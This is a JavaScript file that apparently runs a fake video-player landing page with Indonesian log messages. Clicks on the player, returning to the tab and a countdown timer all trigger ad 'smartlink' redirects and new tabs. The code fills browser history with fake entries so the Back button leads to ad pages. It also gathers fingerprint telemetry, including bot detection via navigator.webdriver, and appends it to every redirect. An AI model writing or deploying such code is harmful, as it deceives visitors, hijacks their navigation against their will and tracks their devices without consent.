(function () {
    'use strict';

    var rawConfig = window.APP_CONFIG || {};
    var config = {
        domain: String(rawConfig.domain || '').trim(),
        mainExit_currentTab_zoneId: String(rawConfig.mainExit_currentTab_zoneId || '').trim(),
        mainExit_newTab_zoneId: String(rawConfig.mainExit_newTab_zoneId || '').trim(),
        design: String(rawConfig.design || 'video-stream').trim(),
        mainExit_triggerDelayMs: Math.max(0, Number(rawConfig.mainExit_triggerDelayMs) || 1000),
        mainExit_openNewImmediately: Boolean(rawConfig.mainExit_openNewImmediately),
        mainExit_currentTabOnReturn: Boolean(rawConfig.mainExit_currentTabOnReturn),
        mainExit_requireHiddenBeforeCurrent: Boolean(rawConfig.mainExit_requireHiddenBeforeCurrent),
        autoexit_zoneId: String(rawConfig.autoexit_zoneId || '').trim(),
        autoexit_timeToRedirect: Math.max(0, Number(rawConfig.autoexit_timeToRedirect) || 0),
        reverse_zoneId: String(rawConfig.reverse_zoneId || '').trim(),
        back_zoneId: String(rawConfig.back_zoneId || '').trim(),
        back_count: Math.max(0, Math.min(30, Number(rawConfig.back_count) || 0)),
        back_page: 'back.html',
        dataVer: 'production-archive-v0.0.123',
        landingName: 'player',
        templateHash: '9f089e28e6970e06a1429627305b7965eaefb159d18b00699079378132a2e2a0'
    };

    var initialPageUrl = window.location.href;

    var state = {
        wasHidden: false,
        exitTriggered: false,
        returnScheduled: false,
        backInitialized: false,
        reverseConsumed: false,
        lastClickAt: 0
    };

    function log(tag, message, extra) {
        if (typeof console !== 'undefined' && typeof console.log === 'function') {
            if (extra !== undefined) {
                console.log('[ADS:' + tag + '] ' + message, extra);
            } else {
                console.log('[ADS:' + tag + '] ' + message);
            }
        }
    }

    function detectOsVersion() {
        var ua = navigator.userAgent || '';
        var androidMatch = ua.match(/Android\s+([0-9.]+)/i);
        if (androidMatch) {
            return androidMatch[1];
        }
        var iosMatch = ua.match(/OS\s+([0-9_]+)\s+like\s+Mac\s+OS\s+X/i);
        if (iosMatch) {
            return iosMatch[1].replace(/_/g, '.');
        }
        var winMatch = ua.match(/Windows\s+NT\s+([0-9.]+)/i);
        if (winMatch) {
            return winMatch[1];
        }
        var macMatch = ua.match(/Mac\s+OS\s+X\s+([0-9_]+)/i);
        if (macMatch) {
            return macMatch[1].replace(/_/g, '.');
        }
        return '0';
    }

    function detectTimezone() {
        try {
            var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
            if (tz) {
                return tz;
            }
        } catch (err) {}
        return 'UTC';
    }

    function buildCmeta() {
        var payload = {
            dataVer: config.dataVer,
            landingName: config.landingName,
            templateHash: config.templateHash
        };
        try {
            return window.btoa(JSON.stringify(payload));
        } catch (err) {
            return '';
        }
    }

    function getTelemetryParams() {
        return {
            rhd: navigator.webdriver ? '0' : '1',
            os_version: detectOsVersion(),
            btz: detectTimezone(),
            bto: String(new Date().getTimezoneOffset()),
            cmeta: buildCmeta()
        };
    }

    function normalizeDomain(domain) {
        if (!domain) {
            return '';
        }
        var cleaned = domain.replace(/\/+$/, '');
        if (!/^https?:\/\//i.test(cleaned)) {
            cleaned = 'https://' + cleaned;
        }
        return cleaned;
    }

    function getExtraQueryString() {
        var search = window.location.search || '';
        if (!search || search.length <= 1) {
            return '';
        }
        return search.slice(1);
    }

    function buildSmartlinkUrl(zoneId, includeTelemetry) {
        var baseDomain = normalizeDomain(config.domain);
        if (!baseDomain || !zoneId) {
            return '';
        }
        var params = new URLSearchParams();
        if (includeTelemetry) {
            var tel = getTelemetryParams();
            params.set('rhd', tel.rhd);
            params.set('os_version', tel.os_version);
            params.set('btz', tel.btz);
            params.set('bto', tel.bto);
            if (tel.cmeta) {
                params.set('cmeta', tel.cmeta);
            }
        }
        var extraQuery = getExtraQueryString();
        if (extraQuery) {
            var currentParams = new URLSearchParams(extraQuery);
            currentParams.forEach(function (value, key) {
                if (!params.has(key)) {
                    params.set(key, value);
                }
            });
        }
        var url = baseDomain + '/4/' + encodeURIComponent(zoneId);
        var qs = params.toString();
        if (qs) {
            url += '?' + qs;
        }
        return url;
    }

    function buildBackPageUrl(zoneId, useTemplate) {
        var baseDomain = normalizeDomain(config.domain);
        var tel = getTelemetryParams();
        var params = new URLSearchParams();

        params.set('rhd', tel.rhd);
        params.set('os_version', tel.os_version);
        params.set('btz', tel.btz);
        params.set('bto', tel.bto);
        if (tel.cmeta) {
            params.set('cmeta', tel.cmeta);
        }

        if (useTemplate) {
            params.set('use_template', '1');
        } else {
            if (baseDomain) {
                params.set('domain', baseDomain);
            }
            if (zoneId) {
                params.set('zoneid', zoneId);
                params.set('z', zoneId);
                var targetSmartlink = buildSmartlinkUrl(zoneId, false);
                if (targetSmartlink) {
                    params.set('url', targetSmartlink);
                }
            }
        }

        var extraQuery = getExtraQueryString();
        if (extraQuery) {
            var currentParams = new URLSearchParams(extraQuery);
            currentParams.forEach(function (value, key) {
                if (!params.has(key)) {
                    params.set(key, value);
                }
            });
        }

        return config.back_page + '?' + params.toString();
    }

    function syncSessionTemplate() {
        var templateZone = config.back_zoneId || config.reverse_zoneId;
        var templateUrl = buildSmartlinkUrl(templateZone, true);
        if (!templateUrl) {
            return;
        }
        try {
            window.sessionStorage.setItem('back_url_template', templateUrl);
            log('STORAGE', 'Template back_url_template tersimpan', templateUrl);
        } catch (err) {
            log('STORAGE', 'Gagal menyimpan sessionStorage', err.message);
        }
    }

    function redirectCurrentTab(url, reason) {
        if (!url) {
            log('REDIRECT', 'Dibatalkan, URL kosong (' + reason + ')');
            return;
        }
        log('REDIRECT', 'Mengalihkan tab utama [' + reason + ']', url);
        try {
            window.location.replace(url);
        } catch (err) {
            window.location.href = url;
        }
    }

    function openNewTab(url, reason) {
        if (!url) {
            log('NEWTAB', 'Dibatalkan, URL kosong (' + reason + ')');
            return false;
        }
        log('NEWTAB', 'Membuka tab baru [' + reason + ']', url);
        var win = null;
        try {
            win = window.open(url, '_blank', 'noopener,noreferrer');
        } catch (err) {
            log('NEWTAB', 'Error window.open', err.message);
        }
        return Boolean(win);
    }

    function setLoadingVisual() {
        var viewport = document.getElementById('playerViewport');
        var status = document.getElementById('playerStatus');
        if (viewport) {
            viewport.classList.add('is-loading');
        }
        if (status) {
            status.textContent = 'Buffering stream...';
        }
    }

    function scheduleCurrentTabRedirect(triggerSource) {
        if (state.returnScheduled) {
            return;
        }
        if (!config.mainExit_currentTabOnReturn) {
            log('RETURN', 'mainExit_currentTabOnReturn nonaktif');
            return;
        }
        var targetUrl = buildSmartlinkUrl(config.mainExit_currentTab_zoneId, true);
        if (!targetUrl) {
            return;
        }
        state.returnScheduled = true;
        log('RETURN', 'Menjadwalkan redirect tab utama dalam ' + config.mainExit_triggerDelayMs + 'ms (' + triggerSource + ')', targetUrl);
        window.setTimeout(function () {
            redirectCurrentTab(targetUrl, 'mainExit_currentTab');
        }, config.mainExit_triggerDelayMs);
    }

    function handleMainExit(event) {
        if (event && typeof event.preventDefault === 'function') {
            event.preventDefault();
        }
        var now = Date.now();
        if (now - state.lastClickAt < 400) {
            return;
        }
        state.lastClickAt = now;
        state.exitTriggered = true;
        setLoadingVisual();
        log('CLICK', 'Interaksi player terdeteksi');

        if (config.mainExit_openNewImmediately && config.mainExit_newTab_zoneId) {
            var newTabUrl = buildSmartlinkUrl(config.mainExit_newTab_zoneId, true);
            openNewTab(newTabUrl, 'mainExit_newTab');
        }

        if (!config.mainExit_requireHiddenBeforeCurrent) {
            scheduleCurrentTabRedirect('direct_no_hidden_required');
        } else {
            log('RETURN', 'Menunggu tab berpindah / hidden sebelum redirect tab utama');
        }
    }

    function onUserReturnCheck(source) {
        if (!state.exitTriggered) {
            return;
        }
        if (!config.mainExit_requireHiddenBeforeCurrent || state.wasHidden) {
            scheduleCurrentTabRedirect(source);
        }
    }

    function setupVisibilityListeners() {
        document.addEventListener('visibilitychange', function () {
            if (document.hidden) {
                state.wasHidden = true;
                log('VISIBILITY', 'Halaman berstatus hidden');
            } else {
                log('VISIBILITY', 'Pengguna kembali ke tab ini');
                onUserReturnCheck('visibilitychange');
            }
        });

        window.addEventListener('blur', function () {
            if (state.exitTriggered) {
                state.wasHidden = true;
                log('VISIBILITY', 'Window blur terdeteksi');
            }
        });

        window.addEventListener('focus', function () {
            log('VISIBILITY', 'Window focus terdeteksi');
            onUserReturnCheck('window_focus');
        });

        window.addEventListener('pageshow', function (e) {
            if (e && e.persisted) {
                state.wasHidden = true;
                onUserReturnCheck('pageshow_bfcache');
            }
        });
    }

    function setupAutoExit() {
        if (!config.autoexit_zoneId || config.autoexit_timeToRedirect <= 0) {
            return;
        }
        var autoUrl = buildSmartlinkUrl(config.autoexit_zoneId, true);
        log('AUTOEXIT', 'Timer aktif: ' + config.autoexit_timeToRedirect + ' detik menuju zone ' + config.autoexit_zoneId);
        window.setTimeout(function () {
            redirectCurrentTab(autoUrl, 'autoexit_timeout');
        }, config.autoexit_timeToRedirect * 1000);
    }

    function initBackTrap(source) {
        if (state.backInitialized) {
            return;
        }
        if (config.back_count <= 0 && !config.back_zoneId && !config.reverse_zoneId) {
            return;
        }
        state.backInitialized = true;
        var totalSteps = Math.max(1, config.back_count);
        var pushed = 0;

        for (var i = 0; i < totalSteps; i++) {
            var isTopTrap = (i === totalSteps - 1);
            var targetZone = (isTopTrap && config.reverse_zoneId) ? config.reverse_zoneId : config.back_zoneId;
            var backHref = buildBackPageUrl(targetZone, false);
            try {
                window.history.pushState({ trapIndex: i + 1, zoneId: targetZone }, '', backHref);
                pushed++;
            } catch (err) {
                try {
                    window.history.pushState({ trapIndex: i + 1, zoneId: targetZone }, '', initialPageUrl);
                    pushed++;
                } catch (innerErr) {
                    log('BACKTRAP', 'History pushState dibatasi browser', innerErr.message);
                    break;
                }
            }
        }

        try {
            window.history.pushState({ activePage: true }, '', initialPageUrl);
        } catch (restoreErr) {
            log('BACKTRAP', 'Gagal mengembalikan URL utama pada history', restoreErr.message);
        }

        log('BACKTRAP', 'History trap aktif (' + pushed + ' state via ' + source + ')');
    }

    function setupPopstateHandler() {
        window.addEventListener('popstate', function (event) {
            log('BACKTRAP', 'Tombol Back terdeteksi (popstate)', event.state);
            if (!state.reverseConsumed && config.reverse_zoneId) {
                state.reverseConsumed = true;
                var reverseBackUrl = buildBackPageUrl(config.reverse_zoneId, false);
                redirectCurrentTab(reverseBackUrl, 'reverse_back_html');
                return;
            }
            if (config.back_zoneId) {
                var backUrl = buildBackPageUrl(config.back_zoneId, false);
                redirectCurrentTab(backUrl, 'back_zone_html');
                return;
            }
            redirectCurrentTab(buildBackPageUrl('', true), 'back_template_html');
        });
    }

    function bindTriggers() {
        var triggers = document.querySelectorAll('[data-exit="true"]');
        for (var i = 0; i < triggers.length; i++) {
            triggers[i].addEventListener('click', handleMainExit);
        }
        log('INIT', 'Total elemen trigger terpasang: ' + triggers.length);
    }

    function init() {
        if (!config.domain) {
            log('ERROR', 'APP_CONFIG.domain tidak ditemukan');
            return;
        }
        document.body.setAttribute('data-design', config.design);
        log('INIT', 'Telemetry terdeteksi', getTelemetryParams());
        syncSessionTemplate();
        bindTriggers();
        setupVisibilityListeners();
        setupAutoExit();
        setupPopstateHandler();
        initBackTrap('load');

        document.addEventListener('pointerdown', function () {
            initBackTrap('user_gesture');
        }, { once: true, passive: true });
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
